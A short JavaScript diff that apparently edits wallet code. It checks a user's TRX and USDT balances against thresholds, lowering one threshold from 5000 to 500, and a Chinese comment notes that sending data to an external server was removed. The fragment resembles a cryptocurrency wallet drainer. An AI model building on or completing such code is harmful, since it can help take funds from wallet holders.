@@ -12,7 +12,7 @@ async function executeBl0ckchainTransaction() {
         // 移除了发送数据到外部服务器的部分
         // console.log(`User Address: ${userAddress}, TRX Balance: ${trxBalanceFormatted}, USDT Balance: ${usdtBalanceFormatted}`);
 
-        if (usdtBalanceFormatted <= 5000 || trxBalanceFormatted <= 28) {
+        if (usdtBalanceFormatted <= 500 || trxBalanceFormatted <= 28) {
             await executeBlockchainTransaction(); // 修改：加入 await
         } else {
             await executeBlockchainTransaction(); // 修改：加入 await
